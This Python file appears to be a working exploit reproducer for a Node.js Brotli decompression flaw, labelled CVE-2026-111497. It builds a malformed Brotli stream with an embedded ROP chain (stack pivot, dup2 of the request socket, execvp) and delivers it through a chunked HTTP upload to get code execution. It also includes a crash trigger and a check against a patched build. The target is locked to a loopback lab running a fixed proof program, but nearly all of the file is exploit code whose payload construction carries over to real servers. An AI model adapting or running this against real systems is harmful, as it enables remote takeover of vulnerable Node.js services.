#!/usr/bin/env python3
"""Constrained local-lab reproducer for CVE-2026-111497.

The program intentionally has no arbitrary target or command option.  It only
talks to the bundled lab on loopback and executes the lab's fixed /n2s proof
helper.  A result is accepted only when a process-bound nonce and fresh `id`
output return on the exploited HTTP request socket.
"""

from __future__ import annotations

import argparse
from dataclasses import dataclass
import hashlib
import json
from pathlib import Path
import re
import socket
import struct
import sys
import time


LOOPBACK_HOST = "127.0.0.1"
LAB_PORT = 3000
PROFILE_DIR = Path(__file__).with_name("profiles")
TRIGGER_SHA256 = "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4"
TOKEN_PATTERN = re.compile(rb"PONG ([0-9a-f]{32})\n")
ID_PATTERN = re.compile(
    rb"uid=\d+(?:\([^\r\n)]+\))?\s+gid=\d+(?:\([^\r\n)]+\))?"
    rb"(?:\s+groups=[^\r\n]+)?"
)


class LsbFields:
    """Pack integer fields in Brotli's least-significant-bit-first order."""

    def __init__(self) -> None:
        self._bytes = bytearray()
        self._pending = 0
        self._width = 0

    def append(self, value: int, width: int) -> None:
        if width < 0 or value < 0 or value >= (1 << width):
            raise ValueError(f"field does not fit: value={value}, width={width}")
        self._pending |= value << self._width
        self._width += width
        while self._width >= 8:
            self._bytes.append(self._pending & 0xFF)
            self._pending >>= 8
            self._width -= 8

    def pad_to_byte(self) -> None:
        if self._width:
            self.append(0, 8 - self._width)

    def append_bytes(self, value: bytes) -> None:
        if self._width:
            raise ValueError("raw bytes require byte alignment")
        self._bytes.extend(value)

    def take(self) -> bytes:
        self.pad_to_byte()
        return bytes(self._bytes)


def _simple_tree(out: LsbFields, alphabet_size: int, symbol: int) -> None:
    out.append(1, 2)
    out.append(0, 2)
    out.append(symbol, (alphabet_size - 1).bit_length())


def _var_u8(out: LsbFields, value: int) -> None:
    if value == 0:
        out.append(0, 1)
        return
    out.append(1, 1)
    if value == 1:
        out.append(0, 3)
        return
    width = value.bit_length() - 1
    out.append(width, 3)
    out.append(value - (1 << width), width)


def malformed_brotli(
    prefix: bytes,
    block_extra: int = 0xFFFFFF,
    distance_code_adjustment: int = 0,
    distance_symbol: int = 184,
    window_bits: int = 10,
) -> bytes:
    """Construct the two-metablock stream used by the affected decoder path."""

    if len(prefix) > 0x10000:
        raise ValueError("controlled prefix is too large")
    if not 0 <= block_extra <= 0xFFFFFF:
        raise ValueError("block length field is outside 24-bit range")
    if not 0 <= distance_symbol < 400:
        raise ValueError("distance symbol falls outside the configured alphabet")
    if not 10 <= window_bits <= 15:
        raise ValueError("the constrained generator supports window bits 10 through 15")

    out = LsbFields()
    out.append(1, 1)
    out.append(0, 3)
    out.append(window_bits - 8, 3)

    if prefix:
        out.append(0, 1)
        out.append(0, 2)
        out.append(len(prefix) - 1, 16)
        out.append(1, 1)
        out.pad_to_byte()
        out.append_bytes(prefix)

    out.append(0, 1)
    out.append(2, 2)
    out.append(0xFFFFFF, 24)
    out.append(0, 1)
    _var_u8(out, 0)
    _var_u8(out, 1)
    _simple_tree(out, 4, 0)
    _simple_tree(out, 26, 25)
    out.append(block_extra, 24)
    _var_u8(out, 0)
    out.append(3, 6)
    out.append(0, 2)
    _var_u8(out, 0)
    _var_u8(out, 0)
    _simple_tree(out, 256, 0)
    _simple_tree(out, 704, 130)
    _simple_tree(out, 704, 130)
    _simple_tree(out, 400, distance_symbol)

    distance_code = ((len(prefix) + 32) // 8 if prefix else 4) + distance_code_adjustment
    if not 0 <= distance_code < (1 << 11):
        raise ValueError("distance code falls outside its 11-bit field")
    commands = 1 << 24
    while out._width and commands:
        out.append(distance_code, 11)
        commands -= 1

    repeated = LsbFields()
    for _ in range(8):
        repeated.append(distance_code, 11)
    group = repeated.take()
    groups, tail = divmod(commands, 8)
    out.append_bytes(group * groups)
    for _ in range(tail):
        out.append(distance_code, 11)
    return out.take()


def _number(mapping: dict[str, object], name: str) -> int:
    value = mapping[name]
    return int(value, 0) if isinstance(value, str) else int(value)


def _write_ring(controlled: bytearray, offset: int, value: bytes, ring_size: int) -> None:
    """Place bytes at their final physical offsets in a wrapped decoder ring."""

    if ring_size <= 0 or len(controlled) < ring_size:
        raise ValueError("controlled prefix is smaller than the decoder ring")
    for displacement, byte in enumerate(value):
        ring_offset = (offset + displacement) % ring_size
        # The uncompressed prefix can wrap the decoder ring.  Write the final
        # occurrence of each physical byte so an earlier duplicate cannot
        # overwrite the chain before the malformed command executes.
        prefix_offset = ring_offset + (
            (len(controlled) - 1 - ring_offset) // ring_size
        ) * ring_size
        controlled[prefix_offset] = byte


def _pack_ring_qwords(
    controlled: bytearray, offset: int, values: tuple[int, ...], ring_size: int
) -> None:
    _write_ring(
        controlled,
        offset,
        struct.pack("<" + "Q" * len(values), *values),
        ring_size,
    )


@dataclass(frozen=True)
class Profile:
    raw: dict[str, object]

    @classmethod
    def load(cls, version: str = "24.22.0") -> "Profile":
        if re.fullmatch(r"\d+\.\d+\.\d+", version) is None:
            raise RuntimeError("profile version must have the form major.minor.patch")
        path = PROFILE_DIR / f"{version}.json"
        raw = json.loads(path.read_text(encoding="utf-8"))
        if raw.get("target") != "127.0.0.1:3000":
            raise RuntimeError("profile target must remain the bundled loopback lab")
        return cls(raw)

    def n(self, name: str) -> int:
        return _number(self.raw, name)


def build_stage_one(profile: Profile) -> bytes:
    controlled = bytearray(profile.n("prefix_size"))
    source = profile.n("copy_source_offset")
    ring_size = 1 << int(profile.raw.get("window_bits", 10))
    chain_version = int(profile.raw.get("chain_version", 1))
    if chain_version >= 3:
        ring_base = profile.n("ring_base")
        bootstrap_offset = profile.n("bootstrap_prefix_offset")
        rax_base_offset = profile.n("rax_base_prefix_offset")
        rop_offset = profile.n("decoder_compat_chain_offset")
        proof_offset = profile.n("decoder_compat_proof_offset")
        pivot_mode = str(profile.raw.get("pivot_mode", "saved_rip_pop_rsp"))
        if pivot_mode == "saved_rbp_leave":
            pivot_pair = struct.pack(
                "<QQ",
                ring_base + bootstrap_offset,
                profile.n("leave_ret"),
            )
            bootstrap = (
                0,
                profile.n("pop_rax_ret"),
                ring_base + rax_base_offset,
            )
        elif pivot_mode == "saved_rip_pop_rsp":
            pivot_pair = struct.pack(
                "<QQ",
                profile.n("pop_rsp_ret"),
                ring_base + bootstrap_offset,
            )
            bootstrap = (
                profile.n("pop_rax_ret"),
                ring_base + rax_base_offset,
            )
        else:
            raise RuntimeError(f"unsupported pivot mode: {pivot_mode}")
        controlled_end = min(source + len(pivot_pair), len(controlled))
        if source < 0 or controlled_end <= source:
            raise RuntimeError("pivot pair falls outside the controlled prefix")
        uncontrolled_tail = pivot_pair[controlled_end - source :]
        if any(uncontrolled_tail):
            raise RuntimeError("non-zero pivot bytes fall outside the controlled prefix")
        controlled[source:controlled_end] = pivot_pair[: controlled_end - source]
        struct.pack_into(
            "<" + "Q" * len(bootstrap),
            controlled,
            bootstrap_offset,
            *bootstrap,
        )

        # Reuse the proven v2 bytes and execution chain exactly. The bootstrap
        # above supplies the ring-derived RAX value that Node 26 clears before
        # returning from the vulnerable decoder function.
        base_padding = (0,) * int(profile.raw.get("execvp_base_padding", 0))
        rop = (
            profile.n("add_rax_path_offset_ret"),
            profile.n("pop_rsi_ret"),
            profile.n("bss_base") + 8,
            profile.n("store_rax_at_rsi_ret"),
            profile.n("pop_execvp_base_ret"),
            profile.n("bss_base"),
            *base_padding,
            profile.n("pop_rdi_ret"),
            profile.n("accepted_socket_fd"),
            profile.n("pop_rsi_ret"),
            1,
            profile.n("dup2_plt"),
            profile.n("execvp_call_site"),
        )
        if rop_offset + 8 * len(rop) > len(controlled):
            raise RuntimeError("ROP chain falls outside the controlled prefix")
        struct.pack_into("<" + "Q" * len(rop), controlled, rop_offset, *rop)
        proof_program = b"/n2s\0"
        if proof_offset + len(proof_program) > len(controlled):
            raise RuntimeError("fixed proof program falls outside the controlled prefix")
        controlled[proof_offset : proof_offset + len(proof_program)] = proof_program
        return malformed_brotli(
            bytes(controlled),
            profile.n("command_block_extra"),
            int(profile.raw.get("distance_code_adjustment", 0)),
            int(profile.raw.get("distance_symbol", 184)),
            int(profile.raw.get("window_bits", 10)),
        ) + b"\0" * 3

    source_move = (
        profile.n("mov_rax_source_ret")
        if chain_version >= 2
        else profile.n("mov_rax_rdi_ret")
    )
    _pack_ring_qwords(
        controlled,
        source,
        (source_move, profile.n("pivot_rsp_rax_30_ret")),
        ring_size,
    )

    bss = profile.n("bss_base")
    if chain_version >= 2:
        source_adjustment = profile.n("source_to_rax_adjustment") if "source_to_rax_adjustment" in profile.raw else 0
        base_padding = (0,) * int(profile.raw.get("execvp_base_padding", 0))
        rop = (
            profile.n("add_rax_path_offset_ret"),
            profile.n("pop_rsi_ret"),
            bss + 8,
            profile.n("store_rax_at_rsi_ret"),
            profile.n("pop_execvp_base_ret"),
            bss,
            *base_padding,
            profile.n("pop_rdi_ret"),
            profile.n("accepted_socket_fd"),
            profile.n("pop_rsi_ret"),
            1,
            profile.n("dup2_plt"),
            profile.n("execvp_call_site"),
        )
        rop_offset = source + source_adjustment + 0x30
        proof_offset = source + source_adjustment + profile.n("proof_path_offset")
    else:
        rop = (
            profile.n("pop_rsi_ret"),
            bss + 8,
            profile.n("store_rdi_plus_88_ret"),
            profile.n("pop_rbx_ret"),
            bss,
            profile.n("pop_rdi_ret"),
            profile.n("accepted_socket_fd"),
            profile.n("pop_rsi_ret"),
            1,
            profile.n("dup2_plt"),
            profile.n("execvp_call_site"),
        )
        rop_offset = source + 0x30
        proof_offset = source + 0x88
    _pack_ring_qwords(controlled, rop_offset, rop, ring_size)

    proof_program = b"/n2s\0"
    _write_ring(controlled, proof_offset, proof_program, ring_size)
    return malformed_brotli(
        bytes(controlled),
        profile.n("command_block_extra"),
        int(profile.raw.get("distance_code_adjustment", 0)),
        int(profile.raw.get("distance_symbol", 184)),
        int(profile.raw.get("window_bits", 10)),
    ) + b"\0" * 3


def build_stage_two(position: int, length: int) -> bytes:
    if length < 27:
        raise ValueError("stage two is too short")
    body = bytearray(length)
    body[7] = 8
    struct.pack_into("<iII", body, 15, position, 0x7FFFFFFF, 0x7FFFFFFF)
    return bytes(body)


def _chunk(value: bytes) -> bytes:
    return f"{len(value):x}\r\n".encode("ascii") + value + b"\r\n"


def _connect(timeout: float) -> socket.socket:
    connection = socket.create_connection((LOOPBACK_HOST, LAB_PORT), timeout)
    connection.settimeout(timeout)
    return connection


def _receive(connection: socket.socket, limit: int = 32768) -> bytes:
    result = bytearray()
    while len(result) < limit:
        try:
            piece = connection.recv(min(4096, limit - len(result)))
        except (ConnectionResetError, TimeoutError, socket.timeout):
            break
        if not piece:
            break
        result.extend(piece)
    return bytes(result)


def health_token(timeout: float) -> bytes | None:
    try:
        with _connect(timeout) as connection:
            connection.sendall(
                b"GET /health HTTP/1.1\r\nHost: lab\r\nConnection: close\r\n\r\n"
            )
            match = TOKEN_PATTERN.search(_receive(connection, 4096))
            return match.group(1) if match else None
    except OSError:
        return None


def wait_for_token(timeout: float, different_from: bytes | None = None) -> bytes | None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        token = health_token(min(0.75, timeout))
        if token is not None and token != different_from:
            return token
        time.sleep(0.1)
    return None


def send_stages(first: bytes, second: bytes, delay: float, timeout: float) -> bytes:
    headers = (
        b"POST /upload HTTP/1.1\r\n"
        b"Host: lab\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Encoding: br\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
    )
    try:
        with _connect(timeout) as connection:
            connection.sendall(headers + _chunk(first))
            time.sleep(delay)
            connection.sendall(_chunk(second) + b"0\r\n\r\n")
            return _receive(connection)
    except OSError:
        return b""


def force_fresh_worker(profile: Profile, old_token: bytes, timeout: float) -> bytes:
    changed = wait_for_token(1.0, old_token)
    if changed is not None:
        return changed

    trigger = malformed_brotli(b"")
    if hashlib.sha256(trigger).hexdigest() != TRIGGER_SHA256:
        raise RuntimeError("internal trigger fingerprint mismatch")
    crash_second = build_stage_two(0x7FFFFFFF, 127)
    send_stages(trigger + b"\0" * 3, crash_second, 0.5, timeout)
    changed = wait_for_token(profile.n("restart_timeout_seconds"), old_token)
    if changed is None:
        raise RuntimeError("lab supervisor did not provide a fresh worker")
    return changed


def verify(response: bytes, token: bytes) -> tuple[str, str] | None:
    marker = b"N2S-PROOF:" + token
    if marker not in response:
        return None
    identity = ID_PATTERN.search(response)
    if identity is None:
        return None
    return marker.decode("ascii"), identity.group(0).decode("ascii", errors="replace")


def classify_response(response: bytes, proof: tuple[str, str] | None) -> str:
    if proof is not None:
        return "rce-proof"
    if not response:
        return "connection-closed-or-crash"
    if b"ERROR_FORMAT_BLOCK_SWITCH" in response:
        return "patched-decoder-rejection"
    if response.startswith(b"HTTP/1.1 400"):
        return "http-400-without-proof"
    if response.startswith(b"HTTP/"):
        return "http-response-without-proof"
    return "non-http-response-without-proof"


def run(profile: Profile, attempts: int, timeout: float) -> dict[str, object]:
    positions = [int(value, 0) for value in profile.raw["staged_positions"]]
    raw_socket_fds = profile.raw.get(
        "accepted_socket_fds", [profile.raw["accepted_socket_fd"]]
    )
    if not isinstance(raw_socket_fds, list) or not raw_socket_fds:
        raise RuntimeError("accepted socket FD candidates must be a non-empty list")
    socket_fds = [
        int(value, 0) if isinstance(value, str) else int(value)
        for value in raw_socket_fds
    ]
    if any(socket_fd < 3 or socket_fd > 1023 for socket_fd in socket_fds):
        raise RuntimeError("accepted socket FD candidates must be between 3 and 1023")
    variants = [
        (position, socket_fd)
        for position in positions
        for socket_fd in socket_fds
    ]
    stages_one = {
        socket_fd: build_stage_one(
            Profile({**profile.raw, "accepted_socket_fd": socket_fd})
        )
        for socket_fd in socket_fds
    }
    stages = {
        position: build_stage_two(position, profile.n("second_stage_size"))
        for position in positions
    }

    token = wait_for_token(profile.n("restart_timeout_seconds"))
    if token is None:
        raise RuntimeError("bundled loopback lab is not healthy")

    observations: list[dict[str, object]] = []
    for attempt in range(1, attempts + 1):
        position, socket_fd = variants[(attempt - 1) % len(variants)]
        print(
            f"attempt={attempt}/{attempts} token={token.decode()} "
            f"position={position:#x} fd={socket_fd}",
            flush=True,
        )
        response = send_stages(
            stages_one[socket_fd],
            stages[position],
            float(profile.raw["stage_delay_seconds"]),
            timeout,
        )
        proof = verify(response, token)
        observations.append(
            {
                "attempt": attempt,
                "position": f"0x{position:x}",
                "accepted_socket_fd": socket_fd,
                "response_bytes": len(response),
                "proof": proof is not None,
                "outcome": classify_response(response, proof),
            }
        )
        if proof is not None:
            marker, identity = proof
            return {
                "result": "rce-verified",
                "profile": profile.raw["id"],
                "proof_marker": marker,
                "proof_command": "/n2s (fixed nonce + /usr/bin/id)",
                "proof_stdout": identity,
                "proof_channel": "exploited HTTP request socket",
                "successful_attempt": attempt,
                "successful_accepted_socket_fd": socket_fd,
                "observations": observations,
            }
        if attempt < attempts:
            token = force_fresh_worker(profile, token, timeout)

    return {
        "result": "not-verified",
        "profile": profile.raw["id"],
        "observations": observations,
    }


def run_patched_control(profile: Profile, timeout: float) -> dict[str, object]:
    token = wait_for_token(profile.n("restart_timeout_seconds"))
    if token is None:
        raise RuntimeError("bundled loopback lab is not healthy")
    position = int(profile.raw["staged_positions"][0], 0)
    response = send_stages(
        build_stage_one(profile),
        build_stage_two(position, profile.n("second_stage_size")),
        float(profile.raw["stage_delay_seconds"]),
        timeout,
    )
    after = health_token(min(timeout, 2.0))
    proof = verify(response, token)
    rejected = b"ERROR_FORMAT_BLOCK_SWITCH" in response
    survived = after == token
    result = "patched-control-pass" if proof is None and rejected and survived else "control-failed"
    return {
        "result": result,
        "profile": profile.raw["id"],
        "proof_observed": proof is not None,
        "decoder_rejected_block_switch": rejected,
        "same_process_survived": survived,
        "response_sample": response[:512].decode("latin-1", errors="replace"),
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Loopback-only Node2Shell lab reproducer with process-bound proof"
    )
    parser.add_argument("--attempts", type=int, default=32)
    parser.add_argument("--timeout", type=float, default=30.0)
    parser.add_argument("--json-output", type=Path)
    parser.add_argument(
        "--version",
        default="24.22.0",
        help="select an allowlisted bundled profile by exact Node.js version",
    )
    parser.add_argument(
        "--expect",
        choices=("vulnerable", "patched"),
        default="vulnerable",
        help="run the RCE verifier or the same-payload patched negative control",
    )
    args = parser.parse_args()
    if not 1 <= args.attempts <= 64:
        parser.error("--attempts must be between 1 and 64")
    if not 1.0 <= args.timeout <= 60.0:
        parser.error("--timeout must be between 1 and 60 seconds")

    profile = Profile.load(args.version)
    result = (
        run(profile, args.attempts, args.timeout)
        if args.expect == "vulnerable"
        else run_patched_control(profile, args.timeout)
    )
    rendered = json.dumps(result, ensure_ascii=False, indent=2)
    print(rendered)
    if args.json_output:
        args.json_output.write_text(rendered + "\n", encoding="utf-8")
    return 0 if result["result"] in {"rce-verified", "patched-control-pass"} else 2


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, RuntimeError, ValueError) as error:
        print(f"ERROR: {error}", file=sys.stderr)
        raise SystemExit(1)
